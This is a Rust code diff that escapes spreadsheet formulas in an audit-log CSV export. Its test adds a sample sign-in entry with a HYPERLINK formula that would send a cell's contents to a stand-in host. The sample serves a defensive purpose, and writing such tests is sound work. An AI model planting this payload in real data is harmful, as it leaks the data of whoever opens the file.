@@ -148,16 +148,30 @@ pub fn as_csv(entries: &[Entry]) -> String {
 }
 
 fn field(text: &str) -> String {
+    // WHAT: a cell a spreadsheet would read as a formula starts with a quote mark. WHY: the log holds what strangers typed (an address tried at sign-in), and `=HYPERLINK(...)` opened in Excel by an administrator is the stranger's formula running there.
+    let text = if text.starts_with(['=', '+', '-', '@', '\t', '\r']) { format!("'{text}") } else { text.to_string() };
     if text.contains([',', '"', '\n', '\r']) {
         format!("\"{}\"", text.replace('"', "\"\""))
     } else {
-        text.to_string()
+        text
     }
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn a_cell_a_spreadsheet_would_run_is_written_as_text() {
+        let tried = Entry::new(action::SIGN_IN_REFUSED, "=HYPERLINK(\"http://x.test/?\"&A1,\"Click\")@x.test"); // WHAT: what a stranger typed as an address. WHY: kept in the log, exported to a spreadsheet.
+        let csv = as_csv(&[tried]); // WHAT: the export. WHY: what an administrator opens in Excel.
+        let row = csv.lines().nth(1).unwrap(); // WHAT: the entry's line. WHY: checked.
+        assert!(row.contains(",\"'=HYPERLINK("), "the formula is text: {row}");
+        for start in ["+1", "-1", "@SUM(A1)", "\tx"] {
+            assert!(field(start).starts_with("'") || field(start).starts_with("\"'"), "{start:?} -> {}", field(start));
+        }
+        assert_eq!(field("pat@acme.test"), "pat@acme.test", "an ordinary cell is left alone");
+    }
 
     #[test]
     fn an_entry_reads_as_a_sentence() {
